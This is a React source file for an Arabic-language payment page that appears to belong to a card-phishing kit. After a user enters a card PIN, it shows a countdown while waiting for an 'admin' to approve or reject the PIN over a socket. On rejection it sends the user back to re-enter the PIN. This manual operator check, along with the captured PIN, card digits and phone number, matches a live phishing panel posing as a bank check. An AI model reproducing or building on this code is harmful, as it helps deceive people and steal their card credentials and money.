import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function PINVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket } = useSocket();
  
  const { pinCode, cardLastDigits, phoneNumber, amount } = location.state || {};
  
  const [verificationStatus, setVerificationStatus] = useState('pending'); // pending, approved, rejected
  const [timeLeft, setTimeLeft] = useState(120); // 2 دقيقة

  useEffect(() => {
    // التحقق من وجود البيانات المطلوبة
    if (!pinCode || !cardLastDigits) {
      navigate('/payment-failed');
      return;
    }

    // الاستماع لرد الأدمن
    if (socket) {
      socket.on('pinVerificationStatus', (data) => {
        if (data.status === 'approved') {
          setVerificationStatus('approved');
          setTimeout(() => {
            navigate('/payment-success', {
              state: {
                cardLastDigits,
                phoneNumber,
                amount,
                timestamp: new Date().toISOString()
              }
            });
          }, 1500);
        } else if (data.status === 'rejected') {
          setVerificationStatus('rejected');
          setTimeout(() => {
            navigate('/payment-pin', {
              state: {
                cardLastDigits,
                phoneNumber,
                amount
              },
              replace: true
            });
          }, 2000);
        }
      });

      return () => {
        socket.off('pinVerificationStatus');
      };
    }
  }, [socket, navigate, pinCode, cardLastDigits, phoneNumber, amount]);

  // مؤقت العد التنازلي
  useEffect(() => {
    if (verificationStatus !== 'pending') return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // انتهى الوقت - نرجع لصفحة إدخال PIN
          navigate('/payment-pin', {
            state: {
              cardLastDigits,
              phoneNumber,
              amount
            },
            replace: true
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [verificationStatus, navigate, cardLastDigits, phoneNumber, amount]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getProgressPercentage = () => {
    return ((120 - timeLeft) / 120) * 100;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-amber-50 to-orange-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        {/* الحالة */}
        {verificationStatus === 'pending' && (
          <>
            {/* الأيقونة المتحركة */}
            <div className="flex justify-center mb-6">
              <div className="relative">
                <div className="w-24 h-24 bg-amber-100 rounded-full flex items-center justify-center animate-pulse">
                  <svg className="w-12 h-12 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <div className="absolute inset-0 rounded-full border-4 border-amber-300 animate-ping opacity-75"></div>
              </div>
            </div>

            {/* العنوان */}
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
              جارٍ التحقق من الرمز السري
            </h1>
            <p className="text-center text-gray-600 mb-6">
              يرجى الانتظار حتى يتم التحقق من الرمز السري من قبل النظام
            </p>

            {/* معلومات الرمز السري */}
            <div className="bg-gradient-to-r from-amber-500 to-orange-600 rounded-lg p-6 mb-6 text-white">
              <div className="text-center mb-4">
                <div className="text-sm opacity-90 mb-2">الرمز السري المدخل</div>
                <div className="flex justify-center gap-2" dir="ltr">
                  {pinCode.split('').map((digit, index) => (
                    <div key={index} className="w-12 h-12 bg-white/20 backdrop-blur rounded-lg flex items-center justify-center text-2xl font-bold">
                      •
                    </div>
                  ))}
                </div>
              </div>

              <div className="border-t border-white/30 pt-4 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="text-sm opacity-90">البطاقة:</span>
                  <span className="font-mono" dir="ltr">•••• {cardLastDigits}</span>
                </div>
                {phoneNumber && (
                  <div className="flex justify-between items-center">
                    <span className="text-sm opacity-90">الهاتف:</span>
                    <span dir="ltr">{phoneNumber}</span>
                  </div>
                )}
                {amount && (
                  <div className="flex justify-between items-center pt-2 border-t border-white/30">
                    <span className="text-sm opacity-90">المبلغ:</span>
                    <span className="text-xl font-bold" dir="ltr">QAR {amount}</span>
                  </div>
                )}
              </div>
            </div>

            {/* العد التنازلي */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-gray-600">الوقت المتبقي</span>
                <span className={`text-lg font-bold ${timeLeft < 30 ? 'text-red-600' : 'text-amber-600'}`}>
                  {formatTime(timeLeft)}
                </span>
              </div>
              
              {/* شريط التقدم */}
              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                <div 
                  className={`h-full transition-all duration-1000 ${
                    timeLeft < 30 ? 'bg-red-500' : 'bg-amber-500'
                  }`}
                  style={{ width: `${getProgressPercentage()}%` }}
                />
              </div>
            </div>

            {/* رسالة الانتظار */}
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-4">
              <div className="flex items-start gap-3">
                <svg className="w-6 h-6 text-amber-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <div className="text-sm text-gray-700">
                  <p className="font-semibold mb-1">يتم الآن التحقق من الرمز السري</p>
                  <p>قد يستغرق هذا بضع لحظات. يرجى عدم إغلاق النافذة أو الرجوع للخلف.</p>
                </div>
              </div>
            </div>

            {/* نقاط التحميل المتحركة */}
            <div className="flex justify-center gap-2 mb-6">
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
            </div>
          </>
        )}

        {verificationStatus === 'approved' && (
          <>
            {/* نجح التحقق */}
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center">
                <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
            <h1 className="text-2xl font-bold text-center text-green-600 mb-2">
              تم التحقق بنجاح
            </h1>
            <p className="text-center text-gray-600 mb-6">
              جارٍ إتمام عملية الدفع...
            </p>
          </>
        )}

        {verificationStatus === 'rejected' && (
          <>
            {/* فشل التحقق */}
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center">
                <svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
            <h1 className="text-2xl font-bold text-center text-red-600 mb-2">
              فشل التحقق
            </h1>
            <p className="text-center text-gray-600 mb-6">
              الرمز السري غير صحيح. جارٍ إعادة التوجيه...
            </p>
          </>
        )}

        {/* زر الإلغاء (فقط في حالة الانتظار) */}
        {verificationStatus === 'pending' && (
          <button
            onClick={() => navigate('/payment-failed')}
            className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
          >
            إلغاء العملية
          </button>
        )}
      </div>
    </div>
  );
}
